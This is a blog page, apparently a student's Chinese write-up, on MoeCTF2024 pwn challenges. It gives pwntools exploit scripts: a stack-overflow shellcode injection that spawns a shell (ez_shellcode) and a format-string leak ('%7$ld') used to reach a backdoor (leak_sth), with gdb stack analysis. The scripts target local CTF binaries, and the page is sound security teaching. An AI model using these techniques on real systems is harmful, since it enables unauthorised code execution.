@@ -1,0 +1,957 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MoeCTF2024做题笔记 | Icyice's site</title><meta name="author" content="Icyice"><meta name="copyright" content="Icyice"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MoeCTF2024做题笔记 题目：NotEnoughTime​在正式开始 Pwn 之前，我需要先检测一下你的数学 (?) 能力...​ ​ 我也是疯了，竟然真想跟它拼手速😅 就考验用python来写pwn基础脚本的能力，好吧，这的确是我缺少的 题解​：本题考察 Pwntools 基本用法，虽然是简单的计算加减乘除，但是在输出算式时刻意添加延迟营造网络卡顿环境，并且算式存在多行情况，意在引导使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF2024做题笔记">
+<meta property="og:url" content="http://example.com/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Icyice&#39;s site">
+<meta property="og:description" content="MoeCTF2024做题笔记 题目：NotEnoughTime​在正式开始 Pwn 之前，我需要先检测一下你的数学 (?) 能力...​ ​ 我也是疯了，竟然真想跟它拼手速😅 就考验用python来写pwn基础脚本的能力，好吧，这的确是我缺少的 题解​：本题考察 Pwntools 基本用法，虽然是简单的计算加减乘除，但是在输出算式时刻意添加延迟营造网络卡顿环境，并且算式存在多行情况，意在引导使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/OIO.jpg">
+<meta property="article:published_time" content="2025-03-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-20T04:39:00.103Z">
+<meta property="article:author" content="Icyice">
+<meta property="article:tag" content="PWN,CTF,WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/OIO.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MoeCTF2024做题笔记",
+  "url": "http://example.com/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/",
+  "image": "http://example.com/img/OIO.jpg",
+  "datePublished": "2025-03-09T16:00:00.000Z",
+  "dateModified": "2025-04-20T04:39:00.103Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Icyice",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="http://example.com/2025/03/10/MoeCTF2024%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MoeCTF2024做题笔记',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/OII.jpg);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/OIO.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/me.jpg" alt="Logo"><span class="site-name">Icyice's site</span></a><a class="nav-page-title" href="/"><span class="site-name">MoeCTF2024做题笔记</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">MoeCTF2024做题笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-09T16:00:00.000Z" title="发表于 2025-03-10 00:00:00">2025-03-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-20T04:39:00.103Z" title="更新于 2025-04-20 12:39:00">2025-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">9.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>35分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><strong>MoeCTF2024做题笔记</strong></p>
+<h1 id="题目：NotEnoughTime​"><a href="#题目：NotEnoughTime​" class="headerlink" title="题目：NotEnoughTime​"></a>题目：<code>NotEnoughTime</code>​</h1><p><code>在正式开始 Pwn 之前，我需要先检测一下你的数学 (?) 能力...</code>​</p>
+<p><img src="/./../images/Snipaste_2025-03-28_20-44-32-20250328204500-0uyzkqd.png" alt="Snipaste_2025-03-28_20-44-32">​</p>
+<p>我也是疯了，竟然真想跟它拼手速😅</p>
+<p>就考验用python来写pwn基础脚本的能力，好吧，这的确是我缺少的</p>
+<h5 id="题解​："><a href="#题解​：" class="headerlink" title="题解​："></a><code>题解</code>​：</h5><p>本题考察 Pwntools 基本用法，虽然是简单的计算加减乘除，但是在输出算式时刻意添加延迟营造网络卡顿环境，并且算式存在多行情况，意在引导使用 <code>recvuntil</code>​。注意<strong>在使用 Python</strong> <strong>​<code>eval</code>​</strong>​ <strong>前需要去除多行算式中的</strong>  <strong>​<code>\n</code>​</strong>​ <strong>以及末尾的</strong>  <strong>​<code>=</code>​</strong> ​ <strong>以符合 Python 语法。除法是整数除法，在 Python 语法中为</strong>  <strong>​<code>//</code>​</strong> ​。</p>
+<p>比赛期间注意到很多选手把除法看作浮点数运算，由此触发了许多奇怪的 bug（出题时并没有考虑到会有浮点数输入的情况）。于是临时新增了一个提示。</p>
+<p>Exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = ...</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io.sendline(</span><br><span class="line">        <span class="built_in">str</span>(</span><br><span class="line">            <span class="built_in">eval</span>(</span><br><span class="line">                io.recvuntil(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line">                .replace(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">                .replace(<span class="string">b&quot;=&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line">                .replace(<span class="string">b&quot;/&quot;</span>, <span class="string">b&quot;//&quot;</span>)</span><br><span class="line">                .decode()</span><br><span class="line">            )</span><br><span class="line">        ).encode()</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="脚本功能解析"><a href="#脚本功能解析" class="headerlink" title="脚本功能解析"></a>脚本功能解析</h3><ol>
+<li><p><strong>初始部分</strong>：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = ...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用pwntools库进行二进制交互</li>
+<li><code>io</code>​代表与目标程序的连接(可能是远程服务或本地程序)</li>
+</ul>
+</li>
+<li><p><strong>初始交互</strong>：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(b&quot;=&quot;, b&quot;2&quot;)</span><br><span class="line">io.sendlineafter(b&quot;=&quot;, b&quot;0&quot;)</span><br><span class="line">io.recvuntil(b&quot;!&quot;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>回答前两个预设问题：</p>
+<ul>
+<li>第一个问题(如”1 + 1 =“)回答”2”</li>
+<li>第二个问题(如”4 &#x2F; 3 - 1 =“)故意回答错误的”0”</li>
+</ul>
+</li>
+<li><p>接收直到感叹号的输出</p>
+</li>
+</ul>
+</li>
+<li><p><strong>自动解题循环</strong>：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for _ in range(20):</span><br><span class="line">    io.sendline(</span><br><span class="line">        str(</span><br><span class="line">            eval(</span><br><span class="line">                io.recvuntil(b&quot;=&quot;)</span><br><span class="line">                .replace(b&quot;\n&quot;, b&quot;&quot;)</span><br><span class="line">                .replace(b&quot;=&quot;, b&quot;&quot;)</span><br><span class="line">                .replace(b&quot;/&quot;, b&quot;//&quot;)</span><br><span class="line">                .decode()</span><br><span class="line">            )</span><br><span class="line">        ).encode()</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>循环处理20个数学问题</p>
+</li>
+<li><p>工作流程：</p>
+<ol>
+<li><p>接收直到等号(“=“)的问题字符串</p>
+</li>
+<li><p>预处理：</p>
+<ul>
+<li>移除换行符</li>
+<li>移除等号</li>
+<li>将除法符号”&#x2F;“替换为”&#x2F;&#x2F;“(Python中的整数除法)</li>
+</ul>
+</li>
+<li><p>使用Python的<code>eval()</code>​计算表达式结果</p>
+</li>
+<li><p>将结果转换为字符串并发送</p>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p><strong>最后交互</strong>：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在完成所有计算后，将控制权交给用户进行手动交互</li>
+</ul>
+</li>
+</ol>
+<h4 id="技术细节说明"><a href="#技术细节说明" class="headerlink" title="技术细节说明"></a>技术细节说明</h4><ol>
+<li><p><strong>数学表达式处理</strong>：</p>
+<ul>
+<li><p>使用<code>eval()</code>​动态执行数学表达式</p>
+</li>
+<li><p>将”&#x2F;“替换为”&#x2F;&#x2F;“确保进行整数除法(避免浮点数结果)</p>
+</li>
+<li><p>示例转换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4 / 3 - 1&quot; → &quot;4 // 3 - 1&quot; → eval结果为1</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>二进制数据处理</strong>：</p>
+<ul>
+<li><code>b&quot;=&quot;</code>​等表示字节字符串(二进制模式)</li>
+<li><code>.decode()</code>​将字节串转换为普通字符串</li>
+<li><code>.encode()</code>​将字符串转换回字节串发送</li>
+</ul>
+</li>
+<li><p><strong>pwntools函数</strong>：</p>
+<ul>
+<li><code>sendlineafter()</code>​：在收到指定模式后发送数据</li>
+<li><code>recvuntil()</code>​：接收数据直到指定模式</li>
+<li><code>interactive()</code>​：进入交互模式</li>
+</ul>
+</li>
+</ol>
+<h3 id="Python-eval-函数"><a href="#Python-eval-函数" class="headerlink" title="Python eval() 函数"></a>Python eval() 函数</h3><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p><strong>eval()</strong>  函数用来执行一个字符串表达式，并返回表达式的值。</p>
+<p><strong>字符串表达式</strong>可以包含变量、函数调用、运算符和其他 Python 语法元素。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>以下是 eval() 方法的语法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(expression[, globals[, locals]])</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
+<li>expression – 表达式。</li>
+<li>globals – 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。</li>
+<li>locals – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。</li>
+</ul>
+<p>eval() 函数将字符串 expression 解析为 Python 表达式，并在指定的命名空间中执行它。</p>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>eval() 函数将字符串转换为相应的对象，并返回表达式的结果。</p>
+<hr>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以下展示了使用 eval() 方法的实例：</p>
+<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例 1"></a>实例 1</h3><p>&gt;&gt;&gt;x = 7&gt;&gt;&gt; eval( ‘3 * x’ )21&gt;&gt;&gt; eval(‘pow(2,2)’)4&gt;&gt;&gt; eval(‘2 + 2’)4&gt;&gt;&gt; n=81&gt;&gt;&gt; eval(“n + 4”)85</p>
+<h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例 2"></a>实例 2</h2><h3 id="执行简单的数学表达式"><a href="#执行简单的数学表达式" class="headerlink" title="执行简单的数学表达式"></a>执行简单的数学表达式</h3><p>result &#x3D; eval(“2 + 3 * 4”)<br>print(result)  # 输出: 14</p>
+<h3 id="执行变量引用"><a href="#执行变量引用" class="headerlink" title="执行变量引用"></a>执行变量引用</h3><p>x &#x3D; 10<br>result &#x3D; eval(“x + 5”)<br>print(result)  # 输出: 15</p>
+<h3 id="在指定命名空间中执行表达式"><a href="#在指定命名空间中执行表达式" class="headerlink" title="在指定命名空间中执行表达式"></a>在指定命名空间中执行表达式</h3><p>namespace &#x3D; {‘a’: 2, ‘b’: 3}<br>result &#x3D; eval(“a + b”, namespace)<br>print(result)  # 输出: 5</p>
+<blockquote>
+<p><strong>注意：</strong>  eval() 函数执行的代码具有潜在的安全风险。如果使用不受信任的字符串作为表达式，则可能导致代码注入漏洞，因此，应谨慎使用 eval() 函数，并确保仅执行可信任的字符串表达式。</p>
+</blockquote>
+<p>‍</p>
+<h1 id="题目：ez-shellcode​"><a href="#题目：ez-shellcode​" class="headerlink" title="题目：ez_shellcode​"></a>题目：<code>ez_shellcode</code>​</h1><p><code>肆意溢出并构造shellcode吧！</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&#x27;wt.exe&#x27;,&#x27;wsl&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p.recvuntil(&quot;age&quot;)</span><br><span class="line">p.sendline(&#x27;130&#x27;)</span><br><span class="line">p.recvuntil(&quot;you :\n&quot;)</span><br><span class="line">buf_addr = int(p.recvuntil(&#x27;\n&#x27;).decode(), 16)</span><br><span class="line">log.success(buf_addr)</span><br><span class="line">log.success(type(buf_addr))</span><br><span class="line">payload = asm(shellcraft.sh()).ljust(0x68,b&#x27;a&#x27;) + p64(buf_addr)</span><br><span class="line">p.recvuntil(&quot;say&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目：leak-sth​"><a href="#题目：leak-sth​" class="headerlink" title="题目：leak_sth​"></a>题目：<code>leak_sth</code>​</h1><p><code>简单的猜数字，够幸运就来试试吧。</code>​</p>
+<p>运行一下附件 pwn</p>
+<p><img src="/./../images/1-20250330103821-qepawm9.png" alt="1">​</p>
+<p>看看main()函数</p>
+<p><img src="/./../images/2-20250330104023-zgvl62e.png" alt="2">​</p>
+<p>看看func()函数</p>
+<p><img src="/./../images/4-20250330104251-4lnfydd.png" alt="4">​</p>
+<p>有后门函数backdoor()</p>
+<p>有printf()函数，可以用用格式化字符串漏洞</p>
+<p>由代码可知，如果变量 v3 &#x3D; v2 就可以执行backdoor()函数</p>
+<p><img src="/assets/5-20250330104753-7in09vf.png" alt="5">​</p>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">通过格式化字符串，泄露（leak） v3的值，关键是确定变量 v3 是printf()函数的第几个参数</span></p>
+<p>学会了用gdb来调试程序以确定变量v3在栈中的位置，为第几个参数，也是记录下这题的原因🥰（pwn的学习之路还很漫长，但又向前走了一小步😉，更加了解gdb的用法🚩）</p>
+<h3 id="1-函数栈帧分析"><a href="#1-函数栈帧分析" class="headerlink" title="1. 函数栈帧分析"></a><strong>1. 函数栈帧分析</strong></h3><p>函数 <code>func()</code>​ 的局部变量在栈上的布局如下（x86-64 架构，假设栈从高地址向低地址增长）：</p>
+<p>c语言</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 func()</span><br><span class="line">&#123;</span><br><span class="line">  // ... 变量声明</span><br><span class="line">  __int64 v2;       // [rsp+0h] [rbp-40h]</span><br><span class="line">  __int64 v3;       // [rsp+8h] [rbp-38h]</span><br><span class="line">  char buf[40];     // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+38h] [rbp-8h] (Canary)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的栈布局（低地址在上，高地址在下）：</p>
+<table>
+<thead>
+<tr>
+<th>栈偏移（相对于 rbp）</th>
+<th>变量</th>
+<th>大小</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>​<code>rbp-0x40</code>​</td>
+<td>​<code>v2</code>​</td>
+<td>8字节</td>
+</tr>
+<tr>
+<td>​<code>rbp-0x38</code>​</td>
+<td>​<code>v3</code>​</td>
+<td>8字节</td>
+</tr>
+<tr>
+<td>​<code>rbp-0x30</code>​</td>
+<td>​<code>buf[40]</code>​</td>
+<td>40字节</td>
+</tr>
+<tr>
+<td>​<code>rbp-0x08</code>​</td>
+<td>​<code>v5</code>​(Canary)</td>
+<td>8字节</td>
+</tr>
+</tbody></table>
+<h3 id="2-​printf-buf-​-​-调用时的栈状态"><a href="#2-​printf-buf-​-​-调用时的栈状态" class="headerlink" title="2.  ​printf(buf)​ ​ 调用时的栈状态"></a><strong>2.</strong>  <strong>​<code>printf(buf)</code>​</strong> ​ <strong>调用时的栈状态</strong></h3><p>当 <code>printf(buf)</code>​ 被调用时，x86-64 的调用约定如下：</p>
+<ul>
+<li>前 6 个参数通过寄存器传递：<code>rdi</code>​, <code>rsi</code>​, <code>rdx</code>​, <code>rcx</code>​, <code>r8</code>​, <code>r9</code>​。</li>
+<li>其余参数通过栈传递。</li>
+</ul>
+<p>对于 <code>printf(buf)</code>​：</p>
+<ol>
+<li><strong>第一个参数（格式化字符串）</strong> ：<code>buf</code>​ 的地址通过 <code>rdi</code>​ 传递（不占用栈空间）。</li>
+<li><strong>后续参数</strong>：如果 <code>buf</code>​ 中包含格式化占位符（如 <code>%p</code>​, <code>%x</code>​, <code>%ld</code>​），<code>printf</code>​ 会从 <code>rsi</code>​, <code>rdx</code>​, <code>rcx</code>​, <code>r8</code>​, <code>r9</code>​ 依次读取，之后从栈上读取。</li>
+</ol>
+<p>c语言</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 func()</span><br><span class="line">&#123;</span><br><span class="line">  // ... 变量声明</span><br><span class="line">  __int64 v2;       // [rsp+0h] [rbp-40h]</span><br><span class="line">  __int64 v3;       // [rsp+8h] [rbp-38h]</span><br><span class="line">  char buf[40];     // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+38h] [rbp-8h] (Canary)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-确定-​v3​​-是第几个参数"><a href="#3-确定-​v3​​-是第几个参数" class="headerlink" title="3.  确定 ​v3​​ 是第几个参数"></a><strong>3.</strong>  <strong>确定</strong><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);"> </span><strong>​<code>v3</code>​</strong>​<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);"> </span><strong>是第几个参数</strong></h3><p>我们需要找到 <code>v3</code>​ 在 <code>printf</code>​ 参数列表中的位置：</p>
+<ol>
+<li><p><strong>​<code>printf</code>​</strong>​ <strong>的栈参数起始位置</strong>：</p>
+<ul>
+<li>在 x86-64 中，<code>printf</code>​ 的栈参数从 <code>rsp+8</code>​ 开始（<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">因为 </span><code>call printf</code>​​<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);"> 会将返回地址 </span><code>rip</code>​​<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);"> 压栈，占 8 字节</span>）。</li>
+</ul>
+</li>
+<li><p><strong>​<code>v3</code>​</strong>​ <strong>的栈地址</strong>：</p>
+<ul>
+<li><code>v3</code>​ 位于 <code>rbp-0x38</code>​。</li>
+<li>当前 <code>rsp</code>​ 的值：调用 <code>printf</code>​ 时，<code>rsp</code>​ 会指向返回地址（即 <code>rbp-0x40</code>​ 是 <code>v2</code>​，<code>rbp-0x38</code>​ 是 <code>v3</code>​）。</li>
+<li>因此，<code>v3</code>​ 的地址是 <code>rsp + 0x8</code>​（因为 <code>rbp-0x38 = rsp + 0x8</code>​）。</li>
+</ul>
+</li>
+<li><p><strong>参数位置计算</strong>：</p>
+<ul>
+<li>前 6 个格式化字符串参数通过寄存器传递（<code>rdi</code>​, <code>rsi</code>​, <code>rdx</code>​, <code>rcx</code>​, <code>r8</code>​, <code>r9</code>​），第 7 个开始从栈上读取。</li>
+<li><code>v3</code>​ 位于 <code>rsp+8</code>​，因此它是 <strong>第 7 个参数</strong>（因为栈参数从 <code>rsp+8</code>​ 开始，对应第 7 个）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>但用IDA得到的数据虽然大部分时候是正确，但有时候也会有误，最好要用gdb调试一下，<strong>以gdb的调试结果为准。</strong></p>
+</blockquote>
+<p><code>pion@ubuntu:~/Desktop/challege$ gdb pwn</code>​</p>
+<p><code>pwndbg&gt; b printf Breakpoint 1 at 0x1110 pwndbg&gt; r</code>​</p>
+<p><img src="/assets/6-20250330150848-ud68hvw.png" alt="6">​</p>
+<p><img src="/assets/7-20250330151001-mnwr251.png" alt="7"></p>
+<p>在GDB中可以用·p指令将16进制数转换成二进制数</p>
+<p>这样就leak v3的值（v3是一个random,每次都会随机生成不一样的数）</p>
+<p>将得到的v3的值发过去就getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">#io = remote(&#x27;192.168.75.1&#x27;, 55780)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;name?&#x27;)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.send(&#x27;%7$ld&#x27;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;name:\n&#x27;)</span><br><span class="line"></span><br><span class="line">num = int(io.recvuntil(&#x27;G&#x27;)[:-1])</span><br><span class="line">print(num)</span><br><span class="line">io.recvuntil(&#x27;number\n&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendline(str(num))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
